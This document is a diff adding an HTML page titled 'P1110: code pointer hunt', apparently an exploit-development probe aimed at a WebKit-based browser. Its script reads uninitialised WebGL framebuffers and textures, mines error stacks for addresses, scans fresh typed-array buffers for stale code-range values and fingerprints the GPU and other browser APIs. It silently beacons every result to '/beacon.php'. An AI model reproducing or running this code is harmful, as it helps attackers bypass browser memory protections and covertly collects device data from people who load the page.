@@ -1,0 +1,428 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1110</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}.warn{color:#ff6}</style>
+</head><body>
+<div id="log"></div>
+<canvas id="gl" width="256" height="256" style="display:none"></canvas>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex(v){return'0x'+v.toString(16);}
+
+B('P1110-BOOT','');
+log('phase','=== P1110: CODE POINTER HUNT (multi-vector) ===');
+log('info','Goal: Find ANY code pointer through JS APIs');
+
+// ============================================================
+// PHASE A: WebGL — GPU renderer info + uninitialized reads
+// ============================================================
+log('phase','--- PHASE A: WebGL probe ---');
+var glCanvas=document.getElementById('gl');
+var gl=null;
+try{gl=glCanvas.getContext('webgl')||glCanvas.getContext('experimental-webgl');}catch(e){}
+
+if(!gl){
+  B('P1110-A','noWebGL');
+  log('fail','A: WebGL not available');
+}else{
+  // A1: Renderer/vendor strings
+  var renderer='',vendor='',version='',slVersion='';
+  try{renderer=gl.getParameter(gl.RENDERER);}catch(e){renderer='ERR';}
+  try{vendor=gl.getParameter(gl.VENDOR);}catch(e){vendor='ERR';}
+  try{version=gl.getParameter(gl.VERSION);}catch(e){version='ERR';}
+  try{slVersion=gl.getParameter(gl.SHADING_LANGUAGE_VERSION);}catch(e){slVersion='ERR';}
+  B('P1110-A1','r='+renderer+'|v='+vendor+'|ver='+version+'|sl='+slVersion);
+  log('info','A1: Renderer='+renderer+' Vendor='+vendor);
+  log('info','A1: Version='+version+' GLSL='+slVersion);
+
+  // A2: Available extensions
+  var exts=[];
+  try{exts=gl.getSupportedExtensions()||[];}catch(e){}
+  B('P1110-A2','exts='+exts.length+'|'+exts.slice(0,20).join(','));
+  log('info','A2: '+exts.length+' extensions: '+exts.slice(0,10).join(', '));
+
+  // A3: Debug renderer info (WEBGL_debug_renderer_info)
+  var dbg=null;
+  try{dbg=gl.getExtension('WEBGL_debug_renderer_info');}catch(e){}
+  if(dbg){
+    var ur='',uv='';
+    try{ur=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);}catch(e){ur='ERR';}
+    try{uv=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);}catch(e){uv='ERR';}
+    B('P1110-A3','ur='+ur+'|uv='+uv);
+    log('ptr','A3: Unmasked renderer='+ur+' vendor='+uv);
+  }else{
+    B('P1110-A3','noDbgExt');
+  }
+
+  // A4: Read uninitialized framebuffer (might have stale GPU data)
+  var fb=gl.createFramebuffer();
+  var rb=gl.createRenderbuffer();
+  gl.bindFramebuffer(gl.FRAMEBUFFER,fb);
+  gl.bindRenderbuffer(gl.RENDERBUFFER,rb);
+  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA4,256,256);
+  gl.framebufferRenderbuffer(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.RENDERBUFFER,rb);
+
+  var fbStatus=gl.checkFramebufferStatus(gl.FRAMEBUFFER);
+  if(fbStatus===gl.FRAMEBUFFER_COMPLETE){
+    var pixels=new Uint8Array(256*256*4);
+    gl.readPixels(0,0,256,256,gl.RGBA,gl.UNSIGNED_BYTE,pixels);
+    var nz=0,uniq=new Set();
+    for(var i=0;i<pixels.length;i+=4){
+      var r=pixels[i],g=pixels[i+1],b=pixels[i+2],a=pixels[i+3];
+      if(r||g||b||a){nz++;uniq.add((r<<24|g<<16|b<<8|a)>>>0);}
+    }
+    B('P1110-A4','fbNZ='+nz+'|uniq='+uniq.size);
+    if(nz>0){
+      log('win','A4: Uninitialized FB has '+nz+' nonzero pixels, '+uniq.size+' unique values!');
+      // Dump first few nonzero values
+      var samples=[];
+      for(var i=0;i<pixels.length&&samples.length<8;i+=4){
+        if(pixels[i]||pixels[i+1]||pixels[i+2]||pixels[i+3]){
+          samples.push(hex((pixels[i]<<24|pixels[i+1]<<16|pixels[i+2]<<8|pixels[i+3])>>>0));
+        }
+      }
+      B('P1110-A4-SAMP',samples.join('|'));
+    }else{
+      log('info','A4: Framebuffer zeroed (no stale data)');
+    }
+  }else{
+    B('P1110-A4','fbIncomplete|'+fbStatus);
+  }
+  gl.bindFramebuffer(gl.FRAMEBUFFER,null);
+
+  // A5: Read uninitialized texture
+  var tex=gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D,tex);
+  gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,64,64,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+  var fb2=gl.createFramebuffer();
+  gl.bindFramebuffer(gl.FRAMEBUFFER,fb2);
+  gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tex,0);
+  if(gl.checkFramebufferStatus(gl.FRAMEBUFFER)===gl.FRAMEBUFFER_COMPLETE){
+    var tpix=new Uint8Array(64*64*4);
+    gl.readPixels(0,0,64,64,gl.RGBA,gl.UNSIGNED_BYTE,tpix);
+    var tnz=0;
+    for(var i=0;i<tpix.length;i++)if(tpix[i])tnz++;
+    B('P1110-A5','texNZ='+tnz);
+    if(tnz>0)log('win','A5: Uninitialized texture has '+tnz+' nonzero bytes!');
+    else log('info','A5: Texture zeroed');
+  }
+  gl.bindFramebuffer(gl.FRAMEBUFFER,null);
+
+  // A6: Shader compile error messages (might contain addresses)
+  var vs=gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs,'void main(){gl_Position=INVALID_SYNTAX;}');
+  gl.compileShader(vs);
+  var vsLog=gl.getShaderInfoLog(vs)||'';
+  B('P1110-A6','vsLog='+vsLog.substring(0,200));
+  log('info','A6: Shader error: '+vsLog.substring(0,100));
+}
+
+// ============================================================
+// PHASE B: Error stack traces — might contain function addresses
+// ============================================================
+log('phase','--- PHASE B: Error stack traces ---');
+var stacks=[];
+
+// B1: Regular error
+try{null.x;}catch(e){stacks.push('B1:'+e.stack);}
+
+// B2: Type error from deep call
+function deep(n){if(n<=0)throw new TypeError('deep');return deep(n-1);}
+try{deep(10);}catch(e){stacks.push('B2:'+e.stack);}
+
+// B3: RangeError
+try{new Array(-1);}catch(e){stacks.push('B3:'+e.stack);}
+
+// B4: Error from eval
+try{eval('(');}catch(e){stacks.push('B4:'+e.stack);}
+
+// B5: Error from setTimeout callback
+// (checked asynchronously below)
+
+// B6: Error from Promise rejection
+var promStack='';
+try{
+  new Promise(function(_,reject){reject(new Error('test'));}).catch(function(e){
+    promStack=e.stack;
+    B('P1110-B6','stack='+promStack.substring(0,200));
+  });
+}catch(e){}
+
+var stackData=stacks.map(function(s){return s.substring(0,150);}).join('|||');
+B('P1110-B',stackData.substring(0,800));
+// Look for hex addresses in stacks
+var addrPattern=/0x[0-9a-f]{8,}/gi;
+var addrsFound=[];
+for(var i=0;i<stacks.length;i++){
+  var m=stacks[i].match(addrPattern);
+  if(m)addrsFound=addrsFound.concat(m);
+}
+if(addrsFound.length>0){
+  B('P1110-B-ADDRS',addrsFound.join('|'));
+  log('win','B: Found addresses in stacks: '+addrsFound.join(', '));
+}else{
+  log('info','B: No hex addresses in error stacks');
+}
+
+// ============================================================
+// PHASE C: Performance API — high-res timing + entries
+// ============================================================
+log('phase','--- PHASE C: Performance API ---');
+var perfData=[];
+try{
+  perfData.push('now='+performance.now().toFixed(6));
+  perfData.push('origin='+performance.timeOrigin);
+  var entries=performance.getEntries();
+  perfData.push('entries='+entries.length);
+  for(var i=0;i<Math.min(entries.length,5);i++){
+    var e=entries[i];
+    perfData.push(e.entryType+':'+e.name.substring(0,50)+'@'+e.startTime.toFixed(2));
+  }
+}catch(e){perfData.push('ERR:'+e.message);}
+B('P1110-C',perfData.join('|'));
+log('info','C: '+perfData.join(', '));
+
+// ============================================================
+// PHASE D: WebAudio probe
+// ============================================================
+log('phase','--- PHASE D: WebAudio ---');
+var audioCtx=null;
+try{audioCtx=new(window.AudioContext||window.webkitAudioContext)();}catch(e){}
+if(!audioCtx){
+  B('P1110-D','noAudio');
+  log('fail','D: WebAudio not available');
+}else{
+  var audioData=[];
+  audioData.push('sr='+audioCtx.sampleRate);
+  audioData.push('state='+audioCtx.state);
+  audioData.push('dest='+audioCtx.destination.maxChannelCount+'ch');
+  audioData.push('base='+audioCtx.baseLatency);
+  audioData.push('out='+audioCtx.outputLatency);
+
+  // Create oscillator + analyser to get internal data
+  try{
+    var osc=audioCtx.createOscillator();
+    var analyser=audioCtx.createAnalyser();
+    analyser.fftSize=2048;
+    osc.connect(analyser);
+    analyser.connect(audioCtx.destination);
+    osc.start();
+
+    // Read frequency data — might contain residual internal data
+    var freqData=new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(freqData);
+    var fnz=0;
+    for(var i=0;i<freqData.length;i++)if(freqData[i])fnz++;
+    audioData.push('freqNZ='+fnz+'/'+freqData.length);
+
+    osc.stop();
+  }catch(e){audioData.push('oscErr='+e.message);}
+
+  B('P1110-D',audioData.join('|'));
+  log('info','D: '+audioData.join(', '));
+  try{audioCtx.close();}catch(e){}
+}
+
+// ============================================================
+// PHASE E: Crypto API — subtle.digest internals
+// ============================================================
+log('phase','--- PHASE E: Crypto API ---');
+var cryptoData=[];
+try{
+  var rv=new Uint8Array(32);
+  crypto.getRandomValues(rv);
+  cryptoData.push('rng=ok');
+  // Check if crypto.subtle exists
+  if(crypto.subtle){
+    cryptoData.push('subtle=yes');
+    // Generate a key and export — might leak internal state
+    crypto.subtle.generateKey({name:'AES-GCM',length:256},true,['encrypt','decrypt']).then(function(key){
+      return crypto.subtle.exportKey('raw',key);
+    }).then(function(raw){
+      var kb=new Uint8Array(raw);
+      cryptoData.push('keyLen='+kb.length);
+      B('P1110-E-KEY','len='+kb.length);
+    }).catch(function(e){
+      B('P1110-E-KEY','ERR:'+e.message);
+    });
+  }else{
+    cryptoData.push('subtle=no');
+  }
+}catch(e){cryptoData.push('ERR:'+e.message);}
+B('P1110-E',cryptoData.join('|'));
+log('info','E: '+cryptoData.join(', '));
+
+// ============================================================
+// PHASE F: SVG filter chain — complex filter might overread
+// ============================================================
+log('phase','--- PHASE F: SVG filter ---');
+try{
+  var svg=document.createElementNS('http://www.w3.org/2000/svg','svg');
+  svg.setAttribute('width','256');svg.setAttribute('height','256');
+  svg.style.position='absolute';svg.style.visibility='hidden';
+  var filter=document.createElementNS('http://www.w3.org/2000/svg','filter');
+  filter.id='f';filter.setAttribute('x','-50%');filter.setAttribute('y','-50%');
+  filter.setAttribute('width','200%');filter.setAttribute('height','200%');
+
+  // Chain: turbulence -> displacement -> morphology -> convolve
+  var turb=document.createElementNS('http://www.w3.org/2000/svg','feTurbulence');
+  turb.setAttribute('baseFrequency','0.05');turb.setAttribute('numOctaves','3');
+  turb.setAttribute('result','turb');
+
+  var disp=document.createElementNS('http://www.w3.org/2000/svg','feDisplacementMap');
+  disp.setAttribute('in','SourceGraphic');disp.setAttribute('in2','turb');
+  disp.setAttribute('scale','30');disp.setAttribute('result','disp');
+
+  var morph=document.createElementNS('http://www.w3.org/2000/svg','feMorphology');
+  morph.setAttribute('in','disp');morph.setAttribute('operator','dilate');
+  morph.setAttribute('radius','2');morph.setAttribute('result','morph');
+
+  var conv=document.createElementNS('http://www.w3.org/2000/svg','feConvolveMatrix');
+  conv.setAttribute('in','morph');conv.setAttribute('order','5');
+  conv.setAttribute('kernelMatrix','1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1');
+
+  filter.appendChild(turb);filter.appendChild(disp);
+  filter.appendChild(morph);filter.appendChild(conv);
+  svg.appendChild(filter);
+
+  var rect=document.createElementNS('http://www.w3.org/2000/svg','rect');
+  rect.setAttribute('width','256');rect.setAttribute('height','256');
+  rect.setAttribute('fill','red');rect.setAttribute('filter','url(#f)');
+  svg.appendChild(rect);
+  document.body.appendChild(svg);
+
+  // Read pixels via canvas
+  setTimeout(function(){
+    var c2=document.createElement('canvas');
+    c2.width=256;c2.height=256;
+    var cx=c2.getContext('2d');
+    try{
+      var img=new Image();
+      var svgData=new XMLSerializer().serializeToString(svg);
+      img.onload=function(){
+        cx.drawImage(img,0,0);
+        var pd=cx.getImageData(0,0,256,256);
+        var nz=0;
+        for(var i=3;i<pd.data.length;i+=4)if(pd.data[i]>0)nz++;
+        B('P1110-F','svgPixels='+nz);
+        log('info','F: SVG filter rendered '+nz+' visible pixels');
+      };
+      img.onerror=function(){B('P1110-F','imgErr');};
+      img.src='data:image/svg+xml;base64,'+btoa(svgData);
+    }catch(e){B('P1110-F','ERR:'+e.message);}
+    svg.remove();
+  },200);
+}catch(e){B('P1110-F','ERR:'+e.message);}
+
+// ============================================================
+// PHASE G: Worker availability check
+// ============================================================
+log('phase','--- PHASE G: Worker check ---');
+try{
+  var blob=new Blob(['postMessage("alive")'],{type:'application/javascript'});
+  var url=URL.createObjectURL(blob);
+  var w=new Worker(url);
+  w.onmessage=function(e){
+    B('P1110-G','worker='+e.data);
+    log('win','G: Worker is ALIVE! Message: '+e.data);
+    w.terminate();
+    URL.revokeObjectURL(url);
+  };
+  w.onerror=function(e){
+    B('P1110-G','workerErr='+e.message);
+    log('fail','G: Worker error: '+e.message);
+  };
+  setTimeout(function(){B('P1110-G-TIMEOUT','');},3000);
+}catch(e){
+  B('P1110-G','ERR:'+e.message);
+  log('fail','G: Worker creation failed: '+e.message);
+}
+
+// ============================================================
+// PHASE H: OffscreenCanvas + ImageBitmap
+// ============================================================
+log('phase','--- PHASE H: OffscreenCanvas ---');
+try{
+  if(typeof OffscreenCanvas!=='undefined'){
+    var oc=new OffscreenCanvas(64,64);
+    var octx=oc.getContext('2d');
+    octx.fillStyle='#f00';
+    octx.fillRect(0,0,64,64);
+    var ib=oc.transferToImageBitmap();
+    B('P1110-H','offscreen=yes|w='+ib.width+'|h='+ib.height);
+    log('ok','H: OffscreenCanvas works: '+ib.width+'x'+ib.height);
+  }else{
+    B('P1110-H','offscreen=no');
+    log('info','H: OffscreenCanvas not available');
+  }
+}catch(e){
+  B('P1110-H','ERR:'+e.message);
+  log('fail','H: '+e.message);
+}
+
+// ============================================================
+// PHASE I: SharedArrayBuffer check
+// ============================================================
+log('phase','--- PHASE I: SharedArrayBuffer ---');
+try{
+  if(typeof SharedArrayBuffer!=='undefined'){
+    var sab=new SharedArrayBuffer(1024);
+    B('P1110-I','sab=yes|size='+sab.byteLength);
+    log('win','I: SharedArrayBuffer available!');
+  }else{
+    B('P1110-I','sab=no');
+    log('info','I: SharedArrayBuffer not available');
+  }
+}catch(e){
+  B('P1110-I','ERR:'+e.message);
+}
+
+// ============================================================
+// PHASE J: BigUint64Array on heap objects — scan for code ptrs
+// Allocate many different-size objects, look for vtable-like values
+// ============================================================
+log('phase','--- PHASE J: Heap object scan for code ptrs ---');
+var codeFinds=[];
+// Create objects of various types and sizes
+var objs=[];
+for(var i=0;i<50;i++){
+  objs.push(new ArrayBuffer(64+i*8));
+  objs.push({a:i,b:'x'.repeat(i*10)});
+  objs.push(new Float64Array(8+i));
+  objs.push([1,2,3,i]);
+}
+// Allocate large buffers that might land near interesting objects
+var scanBufs=[];
+for(var i=0;i<20;i++){
+  var ab=new ArrayBuffer(4096);
+  scanBufs.push(new BigUint64Array(ab));
+}
+// Check for any non-zero values (stale data from freed objects)
+var staleCount=0,codeCount=0;
+for(var i=0;i<scanBufs.length;i++){
+  var b=scanBufs[i];
+  for(var q=0;q<b.length;q++){
+    if(b[q]!==0n){
+      staleCount++;
+      var hi=Number(b[q]>>32n);
+      if(hi>=0x200&&hi<=0x7FF){
+        codeCount++;
+        codeFinds.push('buf'+i+'+'+q*8+'='+hex(b[q]));
+      }
+    }
+  }
+}
+B('P1110-J','stale='+staleCount+'|code='+codeCount+(codeFinds.length>0?'|'+codeFinds.slice(0,5).join(','):''));
+if(codeCount>0){
+  log('win','J: Found '+codeCount+' code-range values! '+codeFinds.slice(0,3).join(', '));
+}else{
+  log('info','J: '+staleCount+' stale values, 0 in code range (bmalloc zeroes all)');
+}
+
+// Final
+setTimeout(function(){
+  B('P1110-DONE','');
+  log('phase','=== P1110 COMPLETE ===');
+},3000);
+</script>
+</body></html>
